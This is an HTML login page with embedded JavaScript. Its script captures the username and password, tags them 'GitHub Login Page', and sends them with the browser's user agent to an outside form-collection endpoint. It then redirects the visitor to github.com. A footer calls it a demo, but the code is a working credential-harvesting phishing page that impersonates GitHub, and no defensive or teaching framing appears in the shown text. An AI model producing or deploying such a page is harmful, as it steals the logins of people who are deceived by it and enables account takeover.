<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .logo {
            margin-bottom: 30px;
        }
        
        .logo img {
            max-width: 150px;
            height: auto;
            border-radius: 8px;
        }
        
        .login-form input {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        
        .login-form input:focus {
            outline: none;
            border-color: #4CAF50;
            box-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
        }
        
        .login-button {
            width: 100%;
            padding: 14px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-top: 15px;
            transition: background-color 0.3s;
        }
        
        .login-button:hover {
            background-color: #45a049;
        }
        
        .login-button:active {
            transform: scale(0.98);
        }
        
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        h2 {
            color: #333;
            margin-bottom: 25px;
        }
        
        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Logo Section -->
        <div class="logo">
            <img src="logo.png" alt="Logo">
        </div>
        
        <h2>Login to Your Account</h2>
        
        <!-- Login Form -->
        <form class="login-form" id="loginForm" method="POST" action="https://getform.io/f/agdvjzob">
            <input type="text" name="username" id="username" placeholder="Enter your username" required>
            <input type="password" name="password" id="password" placeholder="Enter your password" required>
            <button type="submit" class="login-button">Login</button>
        </form>
        
        <!-- Success/Error Messages -->
        <div id="successMessage" class="message success">
            Login attempt recorded! You will be redirected shortly...
        </div>
        
        <div id="errorMessage" class="message error">
            There was an error submitting your login. Please try again.
        </div>
        
        <div class="footer">
            This is a demo login page. All login attempts are logged.
        </div>
    </div>

    <script>
        // Get form element
        const loginForm = document.getElementById('loginForm');
        const successMessage = document.getElementById('successMessage');
        const errorMessage = document.getElementById('errorMessage');
        
        // Handle form submission
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault(); // Prevent default form submission
            
            // Get form values
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Validate inputs
            if (!username || !password) {
                showMessage('Please enter both username and password.', 'error');
                return;
            }
            
            // Create form data
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            formData.append('timestamp', new Date().toISOString());
            formData.append('source', 'GitHub Login Page');
            formData.append('user_agent', navigator.userAgent);
            
            try {
                // Send data to GetForm
                const response = await fetch('https://getform.io/f/agdvjzob', {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors' // Important for cross-origin requests
                });
                
                // Since we're using no-cors mode, we can't read the response
                // But we know the request was sent
                
                // Show success message
                showMessage('Login information submitted successfully!', 'success');
                
                // Clear the form
                loginForm.reset();
                
                // Optional: Redirect after a delay (remove if you don't want redirect)
                setTimeout(() => {
                    window.location.href = 'https://github.com';
                }, 2000);
                
            } catch (error) {
                // Show error message
                showMessage('Error submitting login information. Please try again.', 'error');
                console.error('Error:', error);
            }
        });
        
        // Function to show messages
        function showMessage(text, type) {
            // Hide both messages first
            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';
            
            // Show the appropriate message
            if (type === 'success') {
                successMessage.textContent = text;
                successMessage.style.display = 'block';
            } else {
                errorMessage.textContent = text;
                errorMessage.style.display = 'block';
            }
            
            // Hide message after 5 seconds
            setTimeout(() => {
                successMessage.style.display = 'none';
                errorMessage.style.display = 'none';
            }, 5000);
        }
        
        // Optional: Log when page loads
        window.addEventListener('load', function() {
            console.log('Login page loaded');
        });
    </script>
</body>
</html>
